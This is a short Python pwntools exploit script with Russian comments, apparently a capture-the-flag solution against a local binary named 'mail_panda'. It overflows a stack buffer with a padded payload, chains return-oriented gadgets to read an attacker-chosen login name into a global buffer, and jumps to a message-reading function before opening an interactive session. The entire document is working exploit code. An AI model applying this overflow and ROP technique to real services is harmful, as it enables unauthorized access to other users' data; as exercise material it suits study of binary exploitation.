from pwn import *

# Смещение
offset = 0x90 + 8

login_global = 0x0000000000404160   #login
read_jmp = 0x0000000000401364 #
gat = 0x0000000000401520
get_mes = 0x00000000004018B6
# Формируем полезную нагрузку
# payload = cyclic(300)
name = b"melinda44B8582B\0" # наш логин, на который хотим подписаться

payload = b"01\0"+ b"A" * (offset-3) 
# gat


payload += p64(gat)
payload += p64(0)   #файловый дескриптор STDIN_FILENO
payload += p64(login_global)
payload += p64(len(name))

payload += p64(read_jmp) #чтение с консоли
payload += p64(get_mes) 



# Подключаемся к сервису
conn = process("./mail_panda")
input("hello")
conn.sendline(payload)
conn.sendline(name)
conn.interactive()

